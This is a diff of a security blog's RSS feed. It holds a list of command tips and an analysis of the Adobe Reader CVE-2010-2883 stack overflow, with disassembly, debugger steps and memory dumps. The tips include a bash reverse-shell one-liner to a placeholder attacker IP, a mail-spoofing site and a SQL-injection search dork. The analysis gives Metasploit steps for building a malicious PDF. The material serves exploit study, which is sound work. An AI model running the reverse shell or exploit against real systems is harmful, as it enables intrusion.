@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 08 Aug 2016 13:36:43 +0800</pubDate>
-    <lastBuildDate>Mon, 08 Aug 2016 13:36:43 +0800</lastBuildDate>
+    <pubDate>Mon, 08 Aug 2016 20:31:41 +0800</pubDate>
+    <lastBuildDate>Mon, 08 Aug 2016 20:31:41 +0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
@@ -58,10 +58,10 @@
 &lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
 &lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt;bash反弹:
     /bin/bash -i &amp;gt; /dev/tcp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;attacker&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_ip&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;port&amp;gt;&lt;/span&gt; 0&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;amp;&lt;/span&gt;1 2&amp;gt;&amp;amp;1
-&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed - i &#39;/Love/d&#39; 1.txt   删除包含Love的行
+&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed -i &#39;/Love/d&#39; 1.txt   删除包含Love的行
 &lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&amp;gt;&amp;gt;
     先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
-&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar - T mulu.list - czf file.tar.gz
+&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar -T mulu.list -czf file.tar.gz
 &lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;分割大文件再合并
     split -b 20m RevolutionOS.rmvb RevOS_part_,
     cat RevOS_part_&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
@@ -1017,9 +1017,11 @@
 &lt;span class=&quot;p&quot;&gt;156.&lt;/span&gt;pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
 &lt;span class=&quot;p&quot;&gt;157.&lt;/span&gt;grep多行匹配:(eg.匹配exp10it.py中的api)
     pcregrep -M &#39;def .&lt;span class=&quot;ge&quot;&gt;*(.*&lt;/span&gt;):&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;(.&lt;span class=&quot;ge&quot;&gt;*#.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;){1,10}&#39;
-&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法：
+&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
     ps -aux | grep &quot;vmware&quot;
     kill pid_of_error_machine
+&lt;span class=&quot;p&quot;&gt;159.&lt;/span&gt;google dock:
+    site:xxx.xxx.xxx inurl:union select
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
@@ -2274,11 +2276,18 @@ src和dest所指内存区域不可以重叠且dest必须有足够的空间来容
 
 准备工作:
 1.下载adobe reader 9.3.4
-神器站点:
-https://www.oldapps.com/index.php
+    神器站点:
+    https://www.oldapps.com/index.php
 2.制作恶意pdf:
-https://www.freebuf.com/vuls/80072.html
-msf search cve-2010-2883
+    https://www.freebuf.com/vuls/80072.html
+msfconsole
+    search cve-2010-2883
+    use exploit/windows/fileformat/adobe_cooltype_sing
+    set payload windows/exec
+    set cmd calc.exe
+    exploit
+3.实验系统：
+    windwos 2003 R2 sp2 32位
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -2295,102 +2304,104 @@ alt+t搜索所有&quot;SING&quot;
 
 3.具体如下:
 ------------------key code------------------
-.text:0803DCF9
-.text:0803DCF9                 push    ebp
-.text:0803DCFA                 sub     esp, 104h
-.text:0803DD00                 lea     ebp, [esp-4]
-.text:0803DD04                 mov     eax, ___security_cookie
-.text:0803DD09                 xor     eax, ebp
-.text:0803DD0B                 mov     [ebp+108h+var_4], eax
-.text:0803DD11                 push    4Ch
-.text:0803DD13                 mov     eax, offset sub_8184A54
-.text:0803DD18                 call    __EH_prolog3_catch
-.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
-.text:0803DD23                 mov     edi, [ebp+108h+arg_0]
-.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
-.text:0803DD2F                 mov     [ebp+108h+var_130], edi
-.text:0803DD32                 mov     [ebp+108h+var_138], eax
-.text:0803DD35                 call    sub_804172C
-.text:0803DD3A                 xor     esi, esi
-.text:0803DD3C                 cmp     dword ptr [edi+8], 3
-.text:0803DD40                 mov     [ebp+108h+var_10C], esi
-.text:0803DD43                 jz      loc_803DF00
-.text:0803DD49                 mov     [ebp+108h+var_124], esi
-.text:0803DD4C                 mov     [ebp+108h+var_120], esi
-.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
-.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
-.text:0803DD57                 jnz     loc_803DEA9
-.text:0803DD5D                 push    offset aName    ; &quot;name&quot;
-.text:0803DD62                 push    edi             ; int
-.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
-.text:0803DD66                 mov     [ebp+108h+var_119], 0
-.text:0803DD6A                 call    sub_80217D7
-.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
-.text:0803DD72                 jnz     short loc_803DDDD
-.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;
-.text:0803DD79                 push    edi             ; int
-.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]
-.text:0803DD7D                 call    sub_8021B06
-.text:0803DD82                 mov     eax, [ebp+108h+var_12C]
-.text:0803DD85                 cmp     eax, esi
-.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
-.text:0803DD8B                 jz      short loc_803DDC4
-.text:0803DD8D                 mov     ecx, [eax]
-.text:0803DD8F                 and     ecx, 0FFFFh
-.text:0803DD95                 jz      short loc_803DD9F
-.text:0803DD97                 cmp     ecx, 100h
-.text:0803DD9D                 jnz     short loc_803DDC0
-.text:0803DD9F
-.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj
-.text:0803DD9F                 add     eax, 10h
-.text:0803DDA2                 push    eax             ; char *
-.text:0803DDA3                 lea     eax, [ebp+108h+var_108]
-.text:0803DDA6                 push    eax             ; char *
-.text:0803DDA7                 mov     [ebp+108h+var_108], 0
-.text:0803DDAB                 call    strcat
+.text:0803DBF2                 push    ebp
+.text:0803DBF3                 sub     esp, 104h
+.text:0803DBF9                 lea     ebp, [esp-4]
+.text:0803DBFD                 mov     eax, ___security_cookie
+.text:0803DC02                 xor     eax, ebp
+.text:0803DC04                 mov     [ebp+108h+var_4], eax
+.text:0803DC0A                 push    4Ch
+.text:0803DC0C                 mov     eax, offset sub_81847C4
+.text:0803DC11                 call    __EH_prolog3_catch
+.text:0803DC16                 mov     eax, [ebp+108h+arg_C]
+.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]
+.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]
+.text:0803DC28                 mov     [ebp+108h+var_130], edi
+.text:0803DC2B                 mov     [ebp+108h+var_138], eax
+.text:0803DC2E                 call    sub_8041626
+.text:0803DC33                 xor     esi, esi
+.text:0803DC35                 cmp     dword ptr [edi+8], 3
+.text:0803DC39                 mov     [ebp+108h+var_10C], esi
+.text:0803DC3C                 jz      loc_803DDF9
+.text:0803DC42                 mov     [ebp+108h+var_124], esi
+.text:0803DC45                 mov     [ebp+108h+var_120], esi
+.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1
+.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1
+.text:0803DC50                 jnz     loc_803DDA2
+.text:0803DC56                 push    offset aName    ; &quot;name&quot;
+.text:0803DC5B                 push    edi             ; int
+.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]
+.text:0803DC5F                 mov     [ebp+108h+var_119], 0
+.text:0803DC63                 call    sub_802178F
+.text:0803DC68                 cmp     [ebp+108h+var_124], esi
+.text:0803DC6B                 jnz     short loc_803DCD6
+.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;
+.text:0803DC72                 push    edi             ; int
+.text:0803DC73                 lea     ecx, [ebp+108h+var_12C]
+.text:0803DC76                 call    sub_8021ABE
+.text:0803DC7B                 mov     eax, [ebp+108h+var_12C]
+.text:0803DC7E                 cmp     eax, esi
+.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2
+.text:0803DC84                 jz      short loc_803DCBD
+.text:0803DC86                 mov     ecx, [eax]
+.text:0803DC88                 and     ecx, 0FFFFh
+.text:0803DC8E                 jz      short loc_803DC98
+.text:0803DC90                 cmp     ecx, 100h
+.text:0803DC96                 jnz     short loc_803DCB9
+.text:0803DC98
+.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9Cj
+.text:0803DC98                 add     eax, 10h
+.text:0803DC9B                 push    eax             ; char *
+.text:0803DC9C                 lea     eax, [ebp+108h+var_108]
+.text:0803DC9F                 push    eax             ; char *
+.text:0803DCA0                 mov     [ebp+108h+var_108], 0
+.text:0803DCA4                 call    strcat
+.text:0803DCA9                 pop     ecx
+.text:0803DCAA                 pop     ecx
+.text:0803DCAB                 lea     eax, [ebp+108h+var_108]
+.text:0803DCAE                 push    eax
+.text:0803DCAF                 mov     ecx, ebx
+.text:0803DCB1                 call    sub_8001243
+.text:0803DCB6                 mov     eax, [ebp+108h+var_12C]
 --------------end------------------------
 
 4.分析
-a.803ddab处的call strcat的两个参数为803dda2处的eax和803dda6处的eax
-b.在803dda2处下断调试容易跟踪详情
+a.803dca4处的call strcat的两个参数为803dc9b处的eax和803dc9f处的eax
+b.在803dc9b处下断调试容易跟踪详情
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
 &lt;p&gt;0x02 od动态跟踪&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.打开reader,od附加,f9
-2.ctrl+g:803dda2,f2
+2.ctrl+g:803dc9b,f2
 3.reader中打开msf.pdf
-4.od中断到803dda2处,eax=046BF838,对应eax中内容如下:
+4.od中断到803dc9b处,eax=3a0481c,对应eax中内容如下:
 ------------source------------
-98 66 51 E6 AB 53 8B E7 14 A7 82 4A 0C 0C 0C 0C 16 0A 12 37 7A 8C E7 36 3F DC A9 03 A1 E1 CF CB
-7B 78 91 C5 8B 8C F7 5F 3D C8 2F 90 40 D3 35 1E 24 0B 45 5F 64 6D 61 0A 1D 5B 9E 6C 2E F6 6A EB
-89 FB 3E CC 65 83 1A 2B D3 90 68 1B FE 63 ED DA 39 CA 41 28 86 9A 6B B3 CC 51 C7 D5 D9 2A 2C 0F
-61 EF 51 B4 15 34 4C 5E CD B9 F3 26 CE 89 71 48 1F 25 37 4F AD 28 5D 90 B8 53 BA 57 1C E7 86 7D
-66 9F 22 4E 05 68 C6 D0 A9 2F D9 81 BB B7 34 8C 90 E6 52 9F C1 80 F6 4C F4 16 A7 0F 3E 78 88 5C
-8B 12 CE 9A 19 DF E0 D2 B2 96 F6 7F 57 B5 D4 AF E9 4D 16 7A E1 A3 B0 D3 1A 55 2C 79 CF C1 EB 45
-B3 73 5F BC 48 9D 85 4D EF 49 23 6A C7 FB 64 DD 49 2C 86 5F 6D BF 61 FE E6 DC 88 03 E7 54 88 B4
-24 4B 52 2D CF B6 FE C2 70 D1 4F 19 F7 0A A1 80 3D 6C CB 98 71 63 B7 BA 7F CF 86 DE A8 5F 1B D6
-80 30 E0 DA F7 CF 88 4A AD 6A B9 EB E2 67 E6 61 B9 AA 30 0B 60 2C 5E 4E 3D 69 5E 3B 07 AB 07 20
-9E 6E 2C 40 50 C8 88 B8 E4 E7 3A 14 A1 CF D9 92 C6 08 8A 4A 4D C7 C9 5C 2E 98 3C A5 07 99 1B 15
-52 5D B5 CD 55 10 10 1A 9C 83 3F B0 59 1B 3C 34 EA C3 3C 55 BA FC 1E A3 D0 C2 5D 69 FB DF 80 E6
-B8 94 01 BF AF A1 60 09 E3 F4 1F 20 21 3C 25 D5 21 BE C0 11 4C 0D C0 85 F4 CF 3E 04 03 3E BB 05
-C6 83 27 D2 97 1C BA 77 36 25 58 3D 1F A5 10 92 0E 28 5A E8 39 21 66 17 C3 85 AD E2 5E 6C F8 C9
-B1 F4 C7 40 65 95 DD 5F 38 C6 E3 AF 53 F4 E6 AB C0 3B 93 BC 0D 3C 8E E7 8C 5C 10 E7 7F C0 CB D1
-5F 5D 2F 48 29 CD F5 06 F0 BA EF 74 0A AC FD C6 3F 30 AA 6F 8F 9E CD 35 79 6B 4F 6C C5 BF A8 80
-BA 3D BE 39 1A 71 D2 2A EC 15 02 08 96 42 9A 9F EB 73 B3 65 09 2A E1 6E 38 CB 80 4A 0E 53 52 42
-D4 DB EA 3B E2 A6 42 81 B1 B9 15 31 EB B1 37 EB 7F 80 18 16 A9 C5 4F EF 64 D2 5E 82 72 57 2A 1A
-66 42 3A 18 98 E0 69 D7 85 66 82 66 C1 79 A3 A7 D1 18 93 1C 4F CB B6 97 B4 5C 11 98 6C
+C1 23 FF 72 29 25 28 FA 14 A7 82 4A 0C 0C 0C 0C 1A 49 4D 57 BA 5E 73 48 4C 17 A1 86 CC 31 4A 54
+8A 21 53 5A D0 1E 19 C5 14 E2 3F 09 B5 0B 22 8A 04 DD AA 0D 70 22 95 B7 3D 4F 7C B6 BF FB D3 88
+ED D0 8B 34 71 AD 87 22 9A B5 7E 26 17 8F B0 0A CA F5 B3 ED 30 AC B8 98 F8 4A 56 98 42 87 9D 4A
+AB E5 BF 42 08 59 D0 79 1A 7A 7B 6C B7 C7 6D A7 98 66 B2 43 0C A1 7D 34 27 59 BC D2 E6 5B A1 09
+2C 94 DA 54 C3 51 54 CC C1 1B E7 0A 5D ED 16 8E 15 0B 57 30 5A 22 6E D4 73 1D C3 C5 7F 5D F7 6C
+8C 86 FE 39 88 59 1C 66 A6 D3 20 57 04 CE 8C 58 D6 24 BB 75 05 BE 32 EE E3 31 23 FC 3B EA DC C1
+31 60 F7 89 33 A7 EF 7E BD 48 57 EB 7B DB 64 BD 91 D6 C3 D4 74 CA ED 29 4B 1C AE DA EB 81 01 4A
+BB 21 7F 1D A9 68 6A C7 87 7C 74 3B 27 8F 73 81 42 5F 84 AE 6A 88 92 40 F7 33 B1 FC 46 17 A7 86
+88 FE 04 BC 2D 05 87 A9 89 A3 DD A3 60 E6 7B 49 96 6E EA 95 EE 0C 0B 15 5D 56 0E 8B 55 8C 80 C3
+48 B6 B3 8E 1E 80 8A BC 09 71 E4 11 09 97 23 EE C6 08 8A 4A 24 13 A8 4D E5 05 43 96 AC BA 8D FC
+AF 55 9F 3C 3A 84 7E 7B 93 DB 75 2B E3 C7 BF 22 44 2E 46 01 40 8E EA 48 49 F6 C6 ED 0C F4 82 7D
+29 6C B6 DC 7E 73 14 93 F3 71 91 71 C7 B8 FE 0A F3 AF EF 38 B1 EC B5 4C F7 79 DF 50 92 EF D3 D8
+8E BB 68 A1 07 3B CC 97 5D 2A 0D CF 82 AB AC 62 7A 7F 15 E9 DE 2E F4 E6 6B 5F 86 F2 F5 E2 8F 26
+B1 BE 30 EC 1F AE B5 7F 6B 83 BD 67 B9 6B 74 02 34 70 BC C4 CB CF DA 27 C2 3D F7 C1 99 14 49 15
+AC C3 CE 15 DF 97 9D 41 B5 A5 6E C9 7C B6 3E F0 97 6C 12 ED D1 B7 07 24 11 11 EB 83 E5 89 E4 B5
+57 0F 68 52 46 41 5D BB 5A EF 11 07 16 2B D6 C3 0E 96 0C DD F3 38 33 4F 38 CB 80 4A D7 41 7D 87
+3B CA 10 96 BF D5 70 4C 63 B6 A7 C9 CE 0F 61 0B 6C CB 52 EF 11 0C 51 7A E7 2F 39 22 0D 28 6A 89
+87 C4 C3 56 AC 9D 48 DC C8 60 B1 8F 02 6D 49 6B 90 85 E0 C5 FD 5F D1 AA 30 ED FD C2 6C 00 00 00
 -------------end--------------
-共0x23c=572个字节
-5.具体od截图如下
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2010-2883-1.png&quot; /&gt;&lt;/p&gt;
+共18*32-3=573个字节
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;5.f8,f8,f8到803dda7处时eax=12e4b0,也即strcat的目标地址(第一个参数)
-(堆栈窗口中)
+5.f8,f8,f8到803dca0处时eax=12e4b0,也即strcat的目标地址(第一个参数)
+(12e4b0在堆栈窗口中跟随)
 ------------12e4b0-------------
 0012E4B0   0012E400
 0012E4B4   0012E688
@@ -2424,6 +2435,26 @@ D4 DB EA 3B E2 A6 42 81 B1 B9 15 31 EB B1 37 EB 7F 80 18 16 A9 C5 4F EF 64 D2 5E
 0012E524  |0012E598
 
 -------------end---------------
+
+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+f8执行到803dca4处,此时下一句为strcat,803dca0处的mov byte ptr ss:[ebp],0x0,
+ss:[ebp]在od中看到是eax的大小（0x12e4b0）,这句mov指令将12e4b0内存地址对应的数据内容中的数据的第一个字节置0,
+这样strcat(argv1=0x12e4b0,argv2=0x3a0481c)的第一个参数对应内存数据的最低一个字节的内容变为0,
+于是strcat将从12e4b0处开始拼接第二个参数对应的内存数据,而12e4b0在堆栈窗口中的情况如上所示,
+(12e4b0在数据窗口中跟随)
+--------------start--------------
+00 E4 12 00 88 E6 12 00 00 00 00 00 9E 4F 26 04 30 E8 12 00 9C AE 23 08 A9 51 08 08 50 A6 23 08
+4C 97 B8 03 D1 0B 08 08 A4 5A 9F 03 AC E4 12 00 28 E5 12 00 76 BE 36 01 FF FF FF FF 87 85 0C 01
+DA 75 1B 01 5C E5 12 00 6C E5 12 00 58 E5 12 00 54 E5 12 00 19 76 1B 01 78 4C 26 04 04 00 00 00
+88 E6 12 00 00 00 00 00 18 E5 12 00 DA 75 1B 01 88 E5 12 00 98 E5 12 00 AC E5 12 00 E2 8D 36 01
+FF FF FF FF 19 76 1B 01 88 E6 12 00 00 02 00 00 78 E5 12 00 6E 30 08 08 B4 E6 12 00 AC 5A 9F 03
+04 00 00 00 04 00 00 00 35 83 04 08 0A 4F 26 04 04 00 00 00 E0 E5 12 00 00 00 00 00 01 00 00 00
+04 00 00 00 5C E5 12 00 A8 E5 12 00 BC E5 12 00 6D 1C 17 08 66 33 15 0C FE FF FF FF 35 83 04 08
+3F 73 01 08 60 E6 12 00 08 00 00 00 04 00 00 00 57 10 00 08 84 73 01 08 4E 4F 26 04 04 00 00 00
+A8 E6 12 00 36 4E 26 04 F0 E6 12 00 87 D0 0D 08 F0 E6 12 00 E0 E5 12 00 00 00 00 00 D8 E6 12 00
+76 4C 26 04 30 E8 12 00 9C AE 23 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+--------------end----------------
 6.0x12e4b0+0x23c=0x12e6ec
 易知12e4c8处首先被覆盖成03a9dc3f(4中第七个栈单元的内容)
 &lt;/code&gt;&lt;/pre&gt;
